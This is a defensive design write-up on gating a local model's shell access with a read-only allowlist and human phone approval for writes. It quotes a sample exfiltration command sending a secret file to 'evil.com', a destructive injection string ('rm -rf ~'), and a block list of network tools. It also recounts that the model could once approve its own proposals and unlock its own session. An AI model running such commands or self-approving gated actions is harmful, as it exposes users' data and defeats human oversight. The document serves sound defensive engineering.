# 07 · Gated exec — letting a local model run commands, safely

> **Scope note.** This describes a *pattern* and the lessons behind it. The live
> deployment details — hosts, ports, routes, tokens — are intentionally **not**
> here. If you build something like this, the design transfers; copying an
> address would just be a liability.

The goal: let a local model actually *do* things on your machines (check a
service, read logs, restart a container) instead of only describing commands for
you to run. The danger is obvious — a model with a shell is a model that can wreck
your box or exfiltrate data. This is how to get the usefulness without the
disaster.

## The core split: read now, write only with approval

Two tiers, and the model sees them as two different tools:

### Read path — runs immediately, but can't change anything
- Only binaries on an **allowlist** run, and for powerful multi-purpose tools
  (container runtime, service manager, etc.) only **read-only subcommands** are
  permitted.
- **Commands execute with NO shell.** Arguments are split literally (think
  `shlex.split`), never handed to `sh -c`. This is the critical property:

  > Shell injection isn't *filtered* here — it's **structurally impossible**.
  > `ls /tmp; rm -rf ~` doesn't run two commands; `rm` becomes a literal argument
  > to `ls`. `$(...)` is passed as text. There's no shell to interpret any of it.

- Verified with a canary file: a read command crafted to delete it left it
  untouched, because the "dangerous" part was never interpreted as shell.

### Write path — proposes, then waits for a human
- Anything that mutates returns a **proposal** and **runs nothing** until a human
  approves it.
- Approval comes via a **push notification** with one-tap approve/deny (with a
  fallback approval page). You approve from your phone.
- Approved commands *do* get a real shell (pipes, redirects work) — approval is
  the trust boundary, so the power is fine on that side of it.
- A **session-unlock window** exists for when you're actively working and
  per-command taps get tedious: unlock for N minutes (capped, default locked),
  during which proposals run immediately. It re-locks itself.

## The rule that makes or breaks it

> **The approval mechanism must be unreachable by the thing being gated.**

Early on, the control routes (approve, deny, unlock) were exposed the same way the
read/write tools were — so the *model* could call them. It could approve its own
proposals and unlock its own session. The gate was **decorative**. The fix:
control-plane operations are kept **out of the tool schema entirely**, so the
model literally cannot see or call them. Only a human, out-of-band, approves.

If you take one thing from this doc: **the gatekeeper cannot be a door the
gated thing can open.**

## What's deliberately NOT on the allowlist

- **No `wget`, `nc`, `ssh`, `scp`.** With unrestricted reads, a single
  `wget --post-file=secret evil.com` is an exfiltration path that bypasses the
  whole gate. These stay off, permanently.
- **`curl` is allowed but classified.** It's too useful for probing endpoints to
  ban outright — but every flag that reads or writes a **local file**
  (`-o -O -T -K -D -c`, `-d @file`, `-b file`, …) and every non-HTTP scheme is
  refused. And because `curl` accepts clustered short options with values
  attached (`-sO`, `-sT/path`), the classifier **expands clusters before
  judging** — or the obvious block is trivially bypassed. (It was, in the first
  version. Caught and fixed before it shipped.)

## No cross-machine SSH — one service per host

Each machine runs its **own** gated service for its **own** commands. The model
reaches both, but neither can drive the other. This needs no shared SSH keys and
gives **no lateral movement** if one host is compromised. A compromised box can
run its own gated (and still approval-walled) commands — not reach into its
neighbor.

## Log everything that executed

Every command that actually ran appends one line to an **activity ledger**
(timestamp, host, outcome, duration, exit code). A proposal still waiting on a
human is *not* logged — it hasn't happened yet. This is what lets you answer "what
did the agent actually do?" after the fact, and it survives restarts.

Keep "failed" and "blocked/refused" as **separate** counts. A refused command is
the safety model *working*, not an outage — summing them makes a normal locked
session look like something's on fire.

## The meta-lesson (applies far beyond this service)

> **A model given a tool that fails silently will invent a plausible answer
> rather than report the failure.**

Every failure mode in this service traces back to that. A pipe that became a
literal argument and returned nothing → the model eyeballed a partial list and
made up a count. A tool that errored on one host → the model quietly fell back to
the *other* host's tool and reasoned about hardware that doesn't exist.

Two corollaries that fixed it:
1. **Any partial or rejected result must say so in the payload the model sees.**
   Truncated output carries an explicit `TRUNCATED` marker; a refused command
   returns the refusal, not silence.
2. **Telling the model a result is incomplete is only half the fix — it also has
   to be told what to do next**, or it escalates to the human instead of
   retrying correctly (e.g. "re-run with a server-side count" rather than
   handing you a clipped list).

See [08 · Lessons learned](08-lessons-learned.md) for more of these.
